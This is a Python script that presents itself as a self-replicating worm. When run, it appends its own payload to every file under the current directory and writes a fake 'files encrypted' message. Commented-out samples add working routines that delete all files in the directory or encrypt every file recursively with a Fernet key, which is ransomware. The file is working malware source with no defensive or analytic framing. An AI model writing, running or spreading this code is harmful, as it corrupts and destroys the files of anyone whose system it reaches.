import os

# Define a malicious payload that will be added to files
payload = """
# Start of malicious worm payload
import os

def malicious_action():
    # This is a placeholder for a malicious action
    # For example, deleting files or encrypting them
    os.system('echo "Your files have been encrypted!" > malicious_message.txt')

def replicate():
    # Search for all files in the current directory and subdirectories
    for root, dirs, files in os.walk('.'):
        for filename in files:
            file_path = os.path.join(root, filename)
            # Ensure we are only targeting files
            if os.path.isfile(file_path):
                try:
                    # Check if the file is already infected
                    with open(file_path, 'r') as file:
                        content = file.read()
                        if '# Start of malicious worm payload' in content:
                            continue

                    # Infect the file by appending the payload
                    with open(file_path, 'a') as file:
                        file.write(payload)

                    print(f"Infected {file_path}")
                except:
                    pass

malicious_action()
replicate()
# End of malicious worm payload
"""

def malicious_action():
    # This is a placeholder for a malicious action
    os.system('echo "Your files have been encrypted!" > malicious_message.txt')

def replicate():
    # Search for all files in the current directory and subdirectories
    for root, dirs, files in os.walk('.'):
        for filename in files:
            file_path = os.path.join(root, filename)
            # Ensure we are only targeting files
            if os.path.isfile(file_path):
                try:
                    # Check if the file is already infected
                    with open(file_path, 'r') as file:
                        content = file.read()
                        if '# Start of malicious worm payload' in content:
                            continue

                    # Infect the file by appending the payload
                    with open(file_path, 'a') as file:
                        file.write(payload)

                    print(f"Infected {file_path}")
                except:
                    pass

# Trigger the malicious action and the replication process
malicious_action()
replicate()

# Sample Malicious actions

# Sample #1: Deleting all files in current directory

# def malicious_action():
#     # This malicious action deletes all files in the current directory
#     for filename in os.listdir('.'):
#         if os.path.isfile(filename):
#             os.remove(filename)
#             print(f"Deleted {filename}")

# Sample #2: Ransomware

# from cryptography.fernet import Fernet

# def generate_key():
#     # Generates a key for encryption and decryption
#     return Fernet.generate_key()

# def encrypt_file(filename, key):
#     # Encrypts a file
#     with open(filename, 'rb') as file:
#         file_data = file.read()
#     fernet = Fernet(key)
#     encrypted_data = fernet.encrypt(file_data)
#     with open(filename, 'wb') as file:
#         file.write(encrypted_data)
#     print(f"Encrypted {filename}")

# def malicious_action():
#     # Generate an encryption key
#     key = generate_key()
#     with open('encryption_key.key', 'wb') as key_file:
#         key_file.write(key)
#     # Encrypt all files in the current directory
#     for root, dirs, files in os.walk('.'):
#         for filename in files:
#             file_path = os.path.join(root, filename)
#             if os.path.isfile(file_path):
#                 try:
#                     encrypt_file(file_path, key)
#                 except Exception as e:
#                     print(f"Failed to encrypt {file_path}: {e}")
